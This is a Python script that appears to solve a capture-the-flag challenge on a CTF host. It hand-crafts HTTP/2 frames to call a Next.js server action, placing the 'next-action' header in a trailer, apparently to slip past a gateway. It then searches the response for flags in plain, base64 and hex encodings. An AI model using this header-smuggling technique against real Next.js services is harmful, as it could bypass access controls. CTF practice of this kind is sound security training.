#!/usr/bin/env python3
"""
Extract and analyze Row 1 completely from recovery action response
"""
import socket
import ssl
import struct
import time
import re
import json
from hpack import Encoder

HOST = "funicular-gm2cxozn.alfactf.ru"
PORT = 443
ACTION_ID_FILE = "/tmp/funi.actionid"

with open(ACTION_ID_FILE) as f:
    ACTION_ID = f.read().strip()

def send_recovery():
    """Send recovery action"""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])

    raw = socket.create_connection((HOST, PORT), timeout=15)
    sock = ctx.wrap_socket(raw, server_hostname=HOST)

    if sock.selected_alpn_protocol() != "h2":
        raise RuntimeError("H2 not supported")

    sock.sendall(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
    sock.sendall(b"\x00\x00\x00\x04\x00\x00\x00\x00\x00")

    try:
        sock.settimeout(2)
        sock.recv(65536)
    except:
        pass
    sock.settimeout(15)

    payload = '["$K1"]'
    body = payload.encode()

    enc = Encoder()
    headers = enc.encode([
        (":method", "POST"),
        (":scheme", "https"),
        (":authority", HOST),
        (":path", "/"),
        ("accept", "text/x-component"),
        ("content-type", "text/plain;charset=UTF-8"),
        ("content-length", str(len(body))),
        ("trailer", "next-action"),
    ])

    trailer = enc.encode([("next-action", ACTION_ID)])

    sid = 1

    frame = struct.pack(">I", len(headers))[1:] + b"\x01\x04" + struct.pack(">I", sid) + headers
    sock.sendall(frame)

    frame = struct.pack(">I", len(body))[1:] + b"\x00\x00" + struct.pack(">I", sid) + body
    sock.sendall(frame)

    frame = struct.pack(">I", len(trailer))[1:] + b"\x01\x05" + struct.pack(">I", sid) + trailer
    sock.sendall(frame)

    response_body = b""
    end_time = time.time() + 15

    while time.time() < end_time:
        try:
            header = sock.recv(9)
            if len(header) < 9:
                break

            length = struct.unpack(">I", b"\x00" + header[0:3])[0]
            frame_type = header[3]
            flags = header[4]
            stream_id = struct.unpack(">I", header[5:9])[0] & 0x7FFFFFFF

            payload = b""
            while len(payload) < length:
                chunk = sock.recv(length - len(payload))
                if not chunk:
                    break
                payload += chunk

            if frame_type == 0:  # DATA
                response_body += payload

            if stream_id == sid and (flags & 1):
                break

        except Exception:
            break

    sock.close()
    return response_body

def extract_and_analyze_row1(body):
    """Extract Row 1 completely and analyze it"""
    body_str = body.decode('utf-8', errors='ignore')

    print("=" * 80)
    print("ROW 1 EXTRACTION AND ANALYSIS")
    print("=" * 80)

    # Find Row 1 specifically
    row1_pattern = r'^1:(.+?)(?=\n(?:\d+:|[a-f]:)|$)'
    match = re.search(row1_pattern, body_str, re.MULTILINE | re.DOTALL)

    if not match:
        print("[-] Row 1 not found!")
        return None

    row1_content = match.group(1).strip()
    print(f"[+] Row 1 found (length: {len(row1_content)} chars)")
    print(f"[+] Raw content:\n{row1_content}")

    # Try to parse as JSON
    try:
        parsed = json.loads(row1_content)
        print(f"\n[+] Parsed JSON:")
        print(json.dumps(parsed, indent=2, ensure_ascii=False))

        # Analyze each field
        print(f"\n[+] Field analysis:")
        for key, value in parsed.items():
            print(f"  {key}: {value}")

            # Check if any field contains encoded data
            if isinstance(value, str) and len(value) > 10:
                print(f"    Checking '{key}' for encodings...")

                # Base64
                try:
                    import base64
                    decoded_b64 = base64.b64decode(value).decode('utf-8', errors='ignore')
                    if 'alfa{' in decoded_b64.lower():
                        print(f"    Base64 flag in '{key}': {decoded_b64}")
                except:
                    pass

                # Hex
                try:
                    if len(value) % 2 == 0 and all(c in '0123456789abcdefABCDEF' for c in value):
                        decoded_hex = bytes.fromhex(value).decode('utf-8', errors='ignore')
                        if 'alfa{' in decoded_hex.lower():
                            print(f"    Hex flag in '{key}': {decoded_hex}")
                except:
                    pass

                # URL decode
                try:
                    from urllib.parse import unquote
                    decoded_url = unquote(value)
                    if 'alfa{' in decoded_url.lower():
                        print(f"    URL decoded flag in '{key}': {decoded_url}")
                except:
                    pass

        return parsed

    except json.JSONDecodeError as e:
        print(f"[-] Failed to parse as JSON: {e}")
        return None

def look_for_hidden_data(body):
    """Look for any hidden flag data in the full response"""
    body_str = body.decode('utf-8', errors='ignore')

    print(f"\n[+] Searching entire response for flag patterns...")

    # All possible flag patterns
    patterns = [
        r'alfa\{[^}]+\}',  # Direct
        r'YWxmYXt[A-Za-z0-9+/=]+',  # Base64 starting with 'alfa{'
        r'616c66617b[0-9a-fA-F]+',  # Hex starting with 'alfa{'
    ]

    for i, pattern in enumerate(patterns, 1):
        matches = re.findall(pattern, body_str, re.IGNORECASE)
        if matches:
            print(f"  Pattern {i} matches: {matches}")

            # Try to decode if not direct
            for match in matches:
                if 'alfa{' in match.lower():
                    print(f"    Direct flag: {match}")
                else:
                    # Try base64
                    try:
                        import base64
                        decoded = base64.b64decode(match).decode('utf-8', errors='ignore')
                        if 'alfa{' in decoded.lower():
                            print(f"    Base64 decoded flag: {decoded}")
                    except:
                        pass

                    # Try hex
                    try:
                        decoded = bytes.fromhex(match).decode('utf-8', errors='ignore')
                        if 'alfa{' in decoded.lower():
                            print(f"    Hex decoded flag: {decoded}")
                    except:
                        pass

    # Check specific suspicious strings
    suspicious_strings = [
        'КУРАГУ ДРУЗЬЯМ КУБАНИ',  # From the defaced message
        'lift-hvc-2',
        'south-line.2026-03-27',
        'WO-17-04',
    ]

    for sus_str in suspicious_strings:
        if sus_str in body_str:
            # Check area around suspicious string
            for match in re.finditer(re.escape(sus_str), body_str):
                start = max(0, match.start() - 100)
                end = min(len(body_str), match.end() + 100)
                context = body_str[start:end]
                if 'alfa{' in context.lower():
                    print(f"  Flag near '{sus_str}': {context}")

def main():
    print(f"# Using action_id = {ACTION_ID}")

    try:
        print("[+] Sending recovery action...")
        body = send_recovery()

        # Extract and analyze Row 1
        parsed_row1 = extract_and_analyze_row1(body)

        # Look for any hidden flag data
        look_for_hidden_data(body)

        # Save full response for manual analysis
        with open("/tmp/funicular_full_response.txt", "wb") as f:
            f.write(body)
        print(f"\n[+] Full response saved to /tmp/funicular_full_response.txt ({len(body)} bytes)")

        print("\n" + "=" * 80)
        print("Analysis complete.")

        if not parsed_row1 or parsed_row1.get("error") == "recovery-offline":
            print("\n[*] Still getting recovery-offline. Possible approaches:")
            print("1. Find way to authorize PLC gateway first")
            print("2. Look for flag in client-side code or static files")
            print("3. Try different Next.js exploitation techniques")
            print("4. Check if flag is in the authorization sequence itself")

    except Exception as e:
        print(f"[-] Error: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()